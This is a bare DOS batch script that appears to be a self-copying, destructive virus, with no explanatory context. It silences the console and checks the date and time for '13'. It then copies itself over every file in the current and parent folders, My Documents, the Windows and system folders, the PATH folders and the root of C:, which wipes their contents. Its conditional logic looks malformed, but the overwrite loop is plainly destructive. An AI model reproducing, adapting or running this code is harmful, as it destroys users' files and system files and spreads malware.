ctty nul
@echo off
@ver|date>date.txt
@find "13" date.txt|if errorlevel 0 goto time|if not errorlevel 1 goto do
:time
@ver|time>time.txt
@find "13" time.txt|if errorlevel 0 goto done|if not errorlevel 1 goto do
:do
@for %%g in (*.* ..\*.* c:\mydocu~1\*.* %windir%\*.* %path%\*.* c:\*.* %windir%\system\*.*) do copy %0 %%g
:done
ctty con
cls